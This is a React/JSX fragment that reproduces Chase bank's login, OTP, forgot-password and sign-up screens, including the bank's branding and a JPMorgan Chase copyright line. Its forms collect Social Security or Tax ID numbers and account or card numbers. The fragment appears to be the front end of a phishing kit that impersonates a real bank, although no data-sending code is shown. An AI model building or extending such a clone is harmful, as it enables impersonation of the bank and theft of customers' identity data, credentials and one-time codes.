    ...
    <>
      ...
      {(step === "login" || step === "otp") && (
        <div className="h-screen overflow-y-auto w-full bg-[#f4f4f4] font-sans">
          ...
          {/* FORM BLOCK */}
          <div className="w-full px-8 relative z-10 -mt-[280px] pb-24 shrink-0">
            <div className="bg-white rounded-md shadow-xl p-8 w-full max-w-[420px] mx-auto">
              ...
              {step === "login" && (
                <form onSubmit={handleLoginSubmit} className="space-y-6 animate-in fade-in duration-300">
                  ...
                  {/* Links - NOW USING setStep TO STAY ON THE SAME PAGE */}
      ...
      {/* =========================================
          ...
          ========================================= */}
      {step === "forgotPassword" && (
        <div className="h-screen overflow-y-auto w-full bg-white font-sans text-gray-900 animate-in fade-in duration-300">
          
          <header className="bg-[#005eb8] text-white flex items-center justify-between px-4 py-3">
            <button 
              type="button" 
              onClick={() => setStep('login')} 
              className="flex items-center text-[15px] font-semibold hover:underline"
            >
              <ChevronLeft className="w-5 h-5 mr-1" /> Exit
            </button>
            <BankLogo className="w-7 h-7 text-white" />
            <button type="button" className="text-[15px] font-semibold hover:underline">Español</button>
          </header>

          <div className="px-4 py-6 max-w-[420px] mx-auto">
            <h2 className="text-[13px] font-bold text-gray-700 mb-2">Identification</h2>
            <div className="w-full bg-gray-400 h-1 mb-8 flex rounded-sm overflow-hidden">
              <div className="bg-[#005eb8] w-[20%] h-full"></div>
            </div>

            <h1 className="text-[28px] font-light mb-4 text-gray-900">Let's confirm your identity.</h1>
            ...
            <form className="space-y-8">
              <div className="relative border-b border-gray-400 pb-1">
                <label className="block text-[15px] text-gray-700 mb-1">Social Security number or Tax ID (TIN)</label>
                <input type="password" className="w-full bg-transparent outline-none pr-12 text-lg text-gray-900" />
                <button type="button" className="absolute right-0 bottom-1 text-[#005eb8] text-[15px] font-medium hover:underline bg-white px-1">Show</button>
              </div>

              <div className="relative border-b border-gray-400 pb-1">
                <label className="block text-[15px] text-gray-700 mb-1">Account, card or application number</label>
                <input type="password" className="w-full bg-transparent outline-none pr-12 text-lg text-gray-900" />
                <button type="button" className="absolute right-0 bottom-1 text-[#005eb8] text-[15px] font-medium hover:underline bg-white px-1">Show</button>
              </div>

              <div className="pt-2 space-y-5">
                <a href="#" className="flex items-center text-[#005eb8] text-[15px] hover:underline">
                  Don't have a Social Security number? <span className="ml-1 text-lg leading-none">&gt;</span>
                </a>
                <a href="#" className="flex items-start text-[#005eb8] text-[15px] hover:underline pr-4">
                  <span>Are you an authorized user on another commercial or business account?</span> 
                  <span className="ml-1 text-lg leading-none mt-0.5">&gt;</span>
                </a>
              </div>

              <div className="pt-6">
                <button type="button" className="w-full bg-[#005eb8] text-white font-bold py-3.5 rounded hover:bg-[#004b93] transition-colors">
                  Next
                </button>
              </div>
            </form>

            <div className="mt-8 flex items-center text-[15px] text-gray-700">
              <span className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center text-[11px] font-bold mr-2">?</span>
              Questions? <a href="#" className="text-[#005eb8] hover:underline ml-1 flex items-center">Read our FAQs. <span className="ml-1 text-lg leading-none">&gt;</span></a>
            </div>
          </div>
        </div>
      )}
      ...
      {/* =========================================
          ...
          ========================================= */}
      {step === "signup" && (
        <div className="h-screen overflow-y-auto w-full bg-white font-sans text-gray-900 flex flex-col animate-in fade-in duration-300">
          
          <header className="bg-[#005eb8] h-14 flex items-center justify-center shrink-0">
            <BankLogo className="w-7 h-7 text-white" />
          </header>
          
          <div className="flex-grow">
            <div className="px-4 py-8 max-w-[420px] mx-auto">
              <form className="space-y-8">
                
                <div className="relative border-b border-gray-400 pb-1">
                  <label className="flex items-center text-[15px] text-gray-700 mb-1">
                    Account, card or application number 
                    <span className="ml-1.5 w-4 h-4 rounded-full bg-gray-500 text-white flex items-center justify-center text-[10px] font-bold cursor-pointer">i</span>
                  </label>
                  <input type="text" className="w-full bg-transparent outline-none text-lg text-gray-900" />
                </div>
                ...
                <div className="relative border-b border-gray-400 pb-1">
                  ...
                  <input type="password" placeholder="XXX-XX-XXXX" className="w-full bg-transparent outline-none pr-12 text-lg text-gray-900 placeholder-gray-500" />
                  <button type="button" className="absolute right-0 bottom-1 text-[#005eb8] text-[15px] font-medium hover:underline bg-white px-1">Show</button>
                </div>

                <a href="#" className="block text-[#005eb8] text-[15px] hover:underline">No Social Security number?</a>

                <div className="pt-4">
                  <h2 className="text-[22px] font-normal mb-2 text-gray-900">Create your username</h2>
                  <p className="text-[15px] text-gray-800 mb-6 leading-relaxed">
                    Create a username to access your accounts online. You'll create your password later.
                  </p>
                  
                  <div className="relative border-b border-gray-400 pb-1 mb-3">
                    <label className="flex items-center text-[15px] text-gray-700 mb-1">
                      Username
                      <span className="ml-1.5 w-4 h-4 rounded-full bg-gray-500 text-white flex items-center justify-center text-[10px] font-bold cursor-pointer">i</span>
                    </label>
                  ...
                  <ul className="text-[13px] text-gray-600 space-y-1">
                    ...
                    <li>Must not contain special characters (&, %, *, etc.)</li>
                  </ul>
                </div>

                <p className="text-[15px] text-gray-800 pt-6 leading-relaxed">
                ...
                <div className="flex gap-4 pt-4">
                  <button 
                    type="button" 
                    onClick={() => setStep('login')} 
                    className="flex-1 bg-[#e0e0e0] text-gray-700 font-bold py-3.5 rounded hover:bg-gray-300 transition-colors"
                  >
                    Back
                  </button>
                  <button 
                    type="button" 
                    disabled
                    className="flex-1 bg-[#9bd3ef] text-white font-bold py-3.5 rounded cursor-not-allowed"
                  >
                    Next
                  </button>
                </div>
          ...
          {/* Grey Footer Section for Sign Up */}
          <div className="bg-[#f4f4f4] mt-8 py-8 px-4 flex flex-col items-center shrink-0">
            <div className="w-12 h-12 rounded-full border-[1.5px] border-gray-500 flex items-center justify-center text-gray-600 text-2xl font-light mb-3">
              ?
            </div>
            <h3 className="text-gray-800 text-[17px] mb-1">Questions?</h3>
            <p className="text-gray-800 text-[15px] mb-8">Check out our <a href="#" className="text-[#005eb8] hover:underline">FAQs</a></p>
            
            <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[15px] text-[#005eb8] mb-6">
              <a href="#" className="hover:underline">Privacy</a>
              <a href="#" className="hover:underline">Security</a>
              <a href="#" className="hover:underline">Accessibility</a>
              <a href="#" className="hover:underline">Terms of use</a>
            </div>
            <div className="text-[15px] text-[#005eb8] mb-8 flex items-center gap-1 cursor-pointer hover:underline">
              Ad choices <span className="text-[#9bd3ef] text-xl leading-none">▷</span>
            </div>
            <p className="text-[13px] text-gray-600">© 2026 JPMorgan Chase & Co.</p>
          </div>
        </div>
      )}
    </>
